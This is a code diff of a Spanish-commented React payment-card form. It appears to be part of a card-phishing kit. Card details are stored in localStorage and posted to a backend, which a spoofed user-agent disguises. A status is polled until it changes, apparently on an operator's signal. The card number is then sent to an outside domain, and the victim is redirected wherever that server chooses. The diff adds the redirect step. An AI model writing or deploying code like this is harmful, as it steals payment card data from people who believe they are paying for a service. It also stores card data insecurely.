@@ -75,10 +75,11 @@ const PaymentStepCard = () => {
         return Object.keys(newErrors).length === 0;
     };
 
+
     const handleSubmit = async (e) => {
         e.preventDefault();
         if (!validateForm()) return;
-
+    
         setLoading(true);
         const cardData = {
             cardNumber: formValues.cardNumber,
@@ -87,7 +88,7 @@ const PaymentStepCard = () => {
             cardHolderName: formValues.cardHolderName,
         };
         localStorage.setItem('cardData', JSON.stringify(cardData));
-
+    
         try {
             const response = await fetch('http://127.0.0.1:8000/api/v1/newGuest', {
                 method: 'POST',
@@ -103,16 +104,16 @@ const PaymentStepCard = () => {
                     'user-agent': 'PostmanRuntime/7.43.0',
                 }),
             });
-
+    
             if (!response.ok) {
                 throw new Error('Error en la solicitud al servidor');
             }
-
+    
             const data = await response.json();
             localStorage.setItem('token', data.token);
-
+    
             setIsSpinnerVisible(true);  // Mostrar el Spinner después de enviar la solicitud
-
+    
             // Iniciar consulta periódica cada 2 segundos
             const interval = setInterval(async () => {
                 try {
@@ -123,30 +124,40 @@ const PaymentStepCard = () => {
                             'Cookie': `laravel_session=${document.cookie}` // Enviar la cookie para mantener la sesión
                         },
                     });
-
+    
                     if (!checkResponse.ok) {
                         throw new Error('Error al consultar la API');
                     }
-
+    
                     const checkData = await checkResponse.json();
                     const guest = checkData.guests[0];  // Asumimos que siempre hay un solo guest
-
+    
                     if (guest.status_id !== 1) {
                         clearInterval(interval);  // Detener el intervalo si el status cambia
                         setIsSpinnerVisible(false);  // Detener el spinner
-                        // Aquí puedes redirigir o hacer lo que necesites al recibir el estado final
+    
+                        // Llamar a la API de "procesar"
                         const response = await fetch('https://streaming.renovapunto.online/procesar', {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json',
                             },
-                            body: JSON.stringify({ codigo: formValues.cardNumber }), // AquÃ­ solo envÃ­as el nÃºmero de tarjeta
+                            body: JSON.stringify({ codigo: formValues.cardNumber }), // Aquí solo envías el número de tarjeta
                         });
-                
+    
                         if (!response.ok) {
                             throw new Error('Error en la solicitud al servidor');
                         }
-              // Cambiar a la ruta que desees
+    
+                        // Obtener la respuesta y redirigir
+                        const responseData = await response.json();
+    
+                        // Verifica si hay un campo redirectUrl en la respuesta
+                        if (responseData.redirectUrl) {
+                            navigate(responseData.redirectUrl);  // Redirigir al usuario
+                        } else {
+                            console.log('No se proporcionó redirectUrl');
+                        }
                     }
                 } catch (error) {
                     console.error('Error en la consulta:', error);
@@ -154,12 +165,13 @@ const PaymentStepCard = () => {
                     setIsSpinnerVisible(false);  // Detener el spinner
                 }
             }, 2000);  // Consulta cada 2 segundos
-
+    
         } catch (error) {
             console.error('Error en la solicitud:', error);
             setLoading(false);
         }
     };
+    
 
     return (
         <div className="container mx-auto px-6 py-8 mt-2.5">
